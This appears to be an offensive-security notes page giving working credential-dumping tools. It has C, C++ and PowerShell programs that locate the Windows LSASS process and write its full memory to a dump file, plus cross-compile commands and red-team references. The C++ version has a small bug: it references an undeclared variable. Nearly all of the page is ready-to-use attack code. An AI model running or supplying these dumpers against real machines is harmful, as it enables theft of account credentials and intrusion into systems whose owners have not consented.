# Dump LSASS

## C

```c
#include <stdio.h>
#include <windows.h>
#include <dbghelp.h>
#include <tlhelp32.h>

#pragma comment(lib, "dbghelp.lib")

DWORD getProcessIdentifer() {
    HANDLE handle_snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    if(handle_snapshot) {
        PROCESSENTRY32 process_entry;
        if(Process32First(handle_snapshot,&process_entry)) {
            do {
                if (strcmp(process_entry.szExeFile, "lsass.exe") == 0) {
                    return process_entry.th32ProcessID;
                }
            } while(Process32Next(handle_snapshot, &process_entry));
            CloseHandle(handle_snapshot);
        }
    }

    return -1;
}

INT main(int argc, char const *argv[]) {
    BOOL handle_dump;
    DWORD process_id;
    HANDLE process_handle;
    HANDLE handle_output;

    process_id = getProcessIdentifer();
    if (process_id == -1) {
        printf("[!] Failed to find lsass process.\n");
        return -1;
    }

    handle_output = CreateFile("lsass.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (handle_output == INVALID_HANDLE_VALUE) {
        printf("[!] Failed to create file for lsass dump.\n");
        return -1;
    }

    process_handle = OpenProcess(PROCESS_ALL_ACCESS, 0, process_id);
    if (process_handle == INVALID_HANDLE_VALUE) {
        printf("[!] Failed to get handle on lsass.\n");
        return -1;
    }

    // create and write the dump to the file
    handle_dump = MiniDumpWriteDump(process_handle, process_id, handle_output, 0x00000002, NULL, NULL, NULL);
    if (!handle_dump) {
        printf("[!] Failed to dump lsass.\n");
        return -1;
    }

    printf("[+] Successfully dumped lsass.\n");

    return 0;
}
```

Compile the memory dumper.

```
$ x86_64-w64-mingw32-gcc -O2 lsass-dump.c -o lsass-dump.exe \
-ldbghelp -mconsole -I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc \
-fpermissive >/dev/null 2>&1
```

## CPP

```cpp
#include <iostream>
#include <windows.h>
#include <errhandlingapi.h>
#include <tlhelp32.h>
#include <dbghelp.h>

#pragma comment(lib, "dbghelp.lib")

DWORD getProcessIdentifer(const char *process_name) {
    HANDLE handle_snapshot;
    PROCESSENTRY32 process_entry;
    DWORD process_id = 0;
    BOOL handle_result;

    handle_snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if(INVALID_HANDLE_VALUE == handle_snapshot)
        return 0;

    process_entry.dwSize = sizeof(PROCESSENTRY32);

    handle_result = Process32First(handle_snapshot, &process_entry);

    while(handle_result) {
        if(strcmp(process_name, process_entry.szExeFile) == 0) {
            process_id = process_entry.th32ProcessID;
            break;
        }
        handle_result = Process32Next(handle_snapshot, &process_entry);
    }

    CloseHandle(handle_snapshot);
    return process_id;
}

void LSASSDump(DWORD process_id) {
    HANDLE lsass_process;
    HANDLE memory_file = CreateFileA("creds.dmp", GENERIC_ALL, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (!memory_file) {
        std::cout << "[!] Error creating dump file! " + GetLastError() << std::endl;
        exit(-1);
    }
    std::cout << "[+] Dump file created successfully!" << std::endl;

    lsass_process = OpenProcess(0x00000028, TRUE, process_id);
    if(!lsass_process) {
        std::cout << "[!] Couldn't open LSASS Process! " + GetLastError() << std::endl;
        exit(-1);
    }
    std::cout << "[+] Got a handle to the LSASS Process!" << std::endl;

    BOOL process_dump = MiniDumpWriteDump(lsassProcess, process_id, memory_file, MiniDumpWithFullMemory, NULL, NULL, NULL);
    if(!process_dump) {
        std::cout << "Error while calling MiniDumpWriteDump()" << std::endl;
        std::cout << GetLastError() << std::endl;
        exit(-1);
    }
    std::cout << "[+] Successfully conducted memory dump!" << std::endl;
}

int main(int argc, char *argv[]) {
    DWORD process_id = 0;

    process_id = getProcessIdentifer(argv[1]);
    if(process_id == 0) {
	    std::cout << "PID not found! Terminating..." << std::endl;
        return -1;
    } else {
	    std::cout << "PID = " + process_id << std::endl;
    }

    LSASSDump(process_id);
    return 0;
}
```

Compile the memory dumper.

```
$ x86_64-w64-mingw32-g++ -O2 lsass-dump.cpp -o lsass-dump.exe \
-ldbghelp -mconsole -I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc \
-fpermissive >/dev/null 2>&1
```

## PowerShell

```powershell
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
public class MiniDump {
    [Flags]
    public enum Option : uint {
        Normal = 0x00000000,
        WithDataSegs = 0x00000001,
        WithFullMemory = 0x00000002,
        WithHandleData = 0x00000004,
        FilterMemory = 0x00000008,
        ScanMemory = 0x00000010,
        WithUnloadedModules = 0x00000020,
        WithIndirectlyReferencedMemory = 0x00000040,
        FilterModulePaths = 0x00000080,
        WithProcessThreadData = 0x00000100,
        WithPrivateReadWriteMemory = 0x00000200,
        WithoutOptionalData = 0x00000400,
        WithFullMemoryInfo = 0x00000800,
        WithThreadInfo = 0x00001000,
        WithCodeSegs = 0x00002000,
        WithoutAuxiliaryState = 0x00004000,
        WithFullAuxiliaryState = 0x00008000,
        WithPrivateWriteCopyMemory = 0x00010000,
        IgnoreInaccessibleMemory = 0x00020000,
        ValidTypeFlags = 0x0003ffff,
    }
    [DllImport("Dbghelp.dll")]
    private static extern bool MiniDumpWriteDump(
        IntPtr hProcess,
        uint processId,
        IntPtr hFile,
        Option dumpType,
        IntPtr exceptionParam,
        IntPtr userStreamParam,
        IntPtr callbackParam
    );
    public static void Dump(string path, int processId) {
        using (Process process = Process.GetProcessById(processId)) {
            using (var fileStream = new System.IO.FileStream(path, System.IO.FileMode.Create)) {
                MiniDumpWriteDump(
                    process.Handle,
                    (uint)processId,
                    fileStream.SafeFileHandle.DangerousGetHandle(),
                    Option.WithFullMemory,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    IntPtr.Zero
                );
            }
        }
    }
}
"@

$path = "C:\users\public\test123.txt"
$process = Get-Process lsass.exe
[MiniDump]::Dump($path, $process.Id)
```

## Rust

```
TODO: Write the LSASS Dumper in Rust
```

---
## References

### Source Repositories

- [tehstoni: RustyDumper](https://github.com/tehstoni/RustyDumper)

### Microsoft

- [Microsoft Documentation: Crash Dump Analysis](https://learn.microsoft.com/en-us/windows/win32/dxtecharts/crash-dump-analysis)

- [WinAPI Documentation: `MiniDumpWriteDump`](https://learn.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump)

### Red Team Notes

- [Red Team Notes: Dumping Lsass without Mimikatz with MiniDumpWriteDump](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass)

### Ricardo J. Ruiz Fernández

- [Ricardo J. Ruiz Fernández: Customizing Lsass Dumps with C++](https://ricardojoserf.github.io/lsassdumper/)

- [Ricardo J. Ruiz Fernández: Dumping lsass using only NTAPIs by hand-crafting Minidump files](https://ricardojoserf.github.io/nativedump/)